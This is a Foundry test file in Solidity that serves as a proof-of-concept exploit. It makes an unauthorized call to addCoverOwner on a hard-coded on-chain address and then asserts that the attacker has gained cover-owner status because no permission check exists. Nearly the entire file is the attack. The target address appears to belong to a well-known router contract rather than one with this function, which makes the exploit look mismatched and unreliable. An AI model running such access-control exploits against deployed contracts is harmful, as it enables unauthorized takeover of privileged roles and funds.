pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVulnerableContract {
    function addCoverOwner(address _owner) external;
    function coverOwners(address _owner) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    IVulnerableContract vulnerable;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "Vulnerable Contract");
        vulnerable = IVulnerableContract(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Call addCoverOwner with attacker address (no permission check!)
        vulnerable.addCoverOwner(attacker);

        // Step 2: Verify the attacker is now a cover owner
        bool isCoverOwner = vulnerable.coverOwners(attacker);
        assertEq(isCoverOwner, true, "Attacker should be a cover owner after exploit");
        assertEq(vulnerable.coverOwners(attacker), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

